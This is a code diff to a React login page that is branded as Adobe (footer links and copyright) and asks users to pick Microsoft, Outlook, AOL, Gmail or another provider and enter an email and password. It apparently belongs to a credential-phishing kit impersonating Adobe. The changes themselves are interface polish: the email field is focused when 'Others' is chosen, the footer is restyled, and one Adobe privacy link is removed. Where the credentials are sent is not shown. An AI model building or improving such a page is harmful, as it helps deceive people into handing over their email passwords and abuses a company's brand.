@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useRef } from 'react';
 import { Eye, EyeOff } from 'lucide-react';
 import { useLogin } from '../hooks/useLogin';
 import Spinner from './common/Spinner';
@@ -33,11 +33,18 @@ const LoginPage: React.FC<LoginPageProps> = ({
   const [showPassword, setShowPassword] = useState(false);
   const [showPasswordStep, setShowPasswordStep] = useState(!!defaultProvider);
   const [provider, setProvider] = useState(defaultProvider || '');
+  const emailInputRef = useRef<HTMLInputElement>(null);
   
   const { isLoading, errorMessage, handleFormSubmit } = useLogin(
     onLoginSuccess,
     onLoginError
   );
+
+  const handleOthersSelect = () => {
+    setProvider('Others');
+    emailInputRef.current?.scrollIntoView({ behavior: 'smooth' });
+    setTimeout(() => emailInputRef.current?.focus(), 300);
+  };
 
   const emailProviders = [
     { name: 'Microsoft', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-icon.png', handler: onOffice365Select },
@@ -45,7 +52,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
     { name: 'Outlook', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png', handler: onOffice365Select },
     { name: 'AOL', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png', handler: onAolSelect },
     { name: 'Gmail', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png', handler: onGmailSelect },
-    { name: 'Others', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png', handler: onOthersSelect },
+    { name: 'Others', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png', handler: handleOthersSelect },
   ];
 
   const handleContinue = (e: React.MouseEvent<HTMLButtonElement>) => {
@@ -122,6 +129,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
                   </label>
                   <input
                     id="email"
+                    ref={emailInputRef}
                     type="email"
                     value={email}
                     onChange={(e) => setEmail(e.target.value)}
@@ -216,13 +224,12 @@ const LoginPage: React.FC<LoginPageProps> = ({
       </div>
 
       {/* Adobe Footer */}
-      <footer className="bg-[#fafafa] border-t border-gray-200 py-4 px-6">
-        <div className="max-w-screen-xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-3">
-          <div className="flex items-center gap-4 text-xs text-gray-500">
+      <footer className="bg-[#fafafa] border-t border-gray-200 py-4 px-4">
+        <div className="flex flex-col items-center gap-3">
+          <div className="flex flex-wrap items-center justify-center gap-3 text-xs text-gray-500">
             <a href="https://www.adobe.com/privacy.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700 hover:underline">Privacy</a>
             <a href="https://www.adobe.com/legal/terms.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700 hover:underline">Terms of Use</a>
             <a href="https://www.adobe.com/privacy/cookies.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700 hover:underline">Cookie preferences</a>
-            <a href="https://www.adobe.com/privacy/ca-rights.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700 hover:underline">Do not sell or share my personal information</a>
           </div>
           <p className="text-xs text-gray-400">Copyright © 2026 Adobe. All rights reserved.</p>
         </div>
